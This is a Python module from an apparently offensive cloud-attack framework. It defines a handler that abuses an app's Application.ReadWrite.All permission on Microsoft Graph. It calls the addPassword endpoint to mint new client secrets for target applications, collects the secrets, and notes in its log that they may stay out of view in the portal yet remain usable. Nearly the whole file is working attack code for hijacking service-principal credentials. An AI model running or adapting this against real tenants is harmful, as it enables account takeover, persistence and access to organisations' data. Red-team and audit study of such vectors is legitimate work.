from attacks.handlers.base_handler import AttackHandler,Request,Response
from typing import List
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.application_rw')


class ApplicationRW_Handler(AttackHandler):

    def handle(self, request: Request,responses:List[Response]):     
        # TODO map request.roles to fit with this attack
        if "Application.ReadWrite.All" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to app_rw_all vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "ApplicationRWVectors"
            message = ""
            error = "ApplicationRWVectors - failed"
            conf = request.attack_config['ApplicationReadWriteAll']
            logger.debug("Application.ReadWrite.All - Allows the app to read all applications and service principals without a "
            "signed-in user.")
            logger.debug("Attack vector - create a new app's secret.")
            logger.debug("Pay attention that it may not appear in the gui (it may take some time), but you will still be able to use "
                "it with the creds of SP's object id:secret")
            
            logger.info("Try running Application.ReadWrite.All on vector: create a new app's secret.")
            try:
                for sp in conf['sp']:
                    create_message_URL = "https://graph.microsoft.com/v1.0/applications/" + sp + "/addPassword"

                    message_obj = {"passwordCredential": {"displayName": conf["dn"]}}

                    res = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                    text = res.json()
                    if res.status_code == 200:
                        status = True
                        secret = text['secretText']
                        message += "Got secret: %s from sp: %s\n" % (secret, sp)

                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in ApplicationRW_Handler function")
            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))

        return super().handle(request,responses)



